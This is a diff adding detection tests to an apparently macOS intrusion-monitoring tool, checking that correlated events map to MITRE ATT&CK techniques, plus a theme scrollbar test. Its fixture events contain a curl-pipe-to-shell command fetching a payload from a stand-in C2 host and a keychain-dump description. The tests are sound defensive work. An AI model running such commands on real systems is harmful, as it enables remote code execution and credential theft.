@@ -11,6 +11,7 @@ from mac_audit_agent.intrusion_correlation import IntrusionCorrelationEngine
 from mac_audit_agent.models import BackgroundMonitorEvent
 from mac_audit_agent.storage import AuditDatabase
 from mac_audit_agent.themes import DEFAULT_THEME_NAME, theme_for_name, theme_stylesheet
+from mac_audit_agent.themes import theme_names
 from mac_audit_agent.ui.main_window import MainWindow
 
 
@@ -88,11 +89,96 @@ def test_ai_summary_is_local_and_redacted(tmp_path: Path) -> None:
     assert "alice" not in ai_summary["event_timeline"][0]["summary"]
 
 
+def test_mitre_attack_launchd_scripted_c2_fingerprint(tmp_path: Path) -> None:
+    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
+    db.record_background_monitor_event(
+        _event(
+            "e-1",
+            "2026-06-01T12:00:00+00:00",
+            "launchdaemon_added",
+            "critical",
+            "launchd plist RunAtLoad executes bash -c curl https://c2.example/payload | sh",
+        )
+    )
+    db.record_background_monitor_event(
+        _event("e-2", "2026-06-01T12:01:00+00:00", "new_network_connection_detected", "high", "outbound command and control beacon over https")
+    )
+
+    report = IntrusionCorrelationEngine(db).build_report()
+    pattern = next(item for item in report.patterns if item.pattern_id == "attack_launchd_scripted_c2")
+
+    assert pattern.severity == "critical"
+    assert pattern.confidence == "high"
+    assert "T1543.004" in pattern.source_trace
+    assert "T1105" in pattern.source_trace
+
+
+def test_mitre_attack_credential_access_persistence_fingerprint(tmp_path: Path) -> None:
+    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
+    db.record_background_monitor_event(
+        _event(
+            "e-1",
+            "2026-06-01T12:00:00+00:00",
+            "execution_evidence_detected",
+            "critical",
+            "security dump-keychain observed before zip archive staging",
+        )
+    )
+    db.record_background_monitor_event(
+        _event("e-2", "2026-06-01T12:03:00+00:00", "launchagent_added", "high", "LaunchAgent persistence RunAtLoad uses osascript")
+    )
+
+    report = IntrusionCorrelationEngine(db).build_report()
+    pattern_ids = {item.pattern_id for item in report.patterns}
+
+    assert "attack_credential_access_persistence" in pattern_ids
+    pattern = next(item for item in report.patterns if item.pattern_id == "attack_credential_access_persistence")
+    assert "T1555.001" in pattern.source_trace
+
+
+def test_mitre_attack_defense_evasion_blindness_fingerprint(tmp_path: Path) -> None:
+    db = AuditDatabase(tmp_path / "audit.sqlite", tmp_path / "logs")
+    db.record_background_monitor_event(
+        _event(
+            "e-1",
+            "2026-06-01T12:00:00+00:00",
+            "protected_monitor_tamper_detected",
+            "critical",
+            "root tamper disabled monitor heartbeat and stopped detector",
+        )
+    )
+    db.record_background_monitor_event(
+        _event(
+            "e-2",
+            "2026-06-01T12:02:00+00:00",
+            "execution_evidence_detected",
+            "critical",
+            "unsigned temp shell execution with launchdaemon persistence",
+        )
+    )
+
+    report = IntrusionCorrelationEngine(db).build_report()
+    pattern = next(item for item in report.patterns if item.pattern_id == "attack_defense_evasion_blindness")
+
+    assert pattern.severity == "critical"
+    assert pattern.confidence == "high"
+    assert "T1562" in pattern.source_trace
+
+
 def test_theme_registry_and_stylesheet() -> None:
     assert theme_for_name("does-not-exist").name == DEFAULT_THEME_NAME
     stylesheet = theme_stylesheet(theme_for_name("High Contrast"), accessibility_override=True)
     assert "#FFFFFF" in stylesheet
     assert "#FF4D5A" in stylesheet
+
+
+def test_all_skins_have_visible_scrollbar_styles() -> None:
+    for name in theme_names():
+        stylesheet = theme_stylesheet(theme_for_name(name), accessibility_override=name == "High Contrast")
+        assert "QScrollBar:vertical" in stylesheet
+        assert "width: 18px" in stylesheet
+        assert "QScrollBar::handle:vertical" in stylesheet
+        assert "#FFD166" in stylesheet
 
 
 def test_theme_switching_persists(tmp_path: Path) -> None:
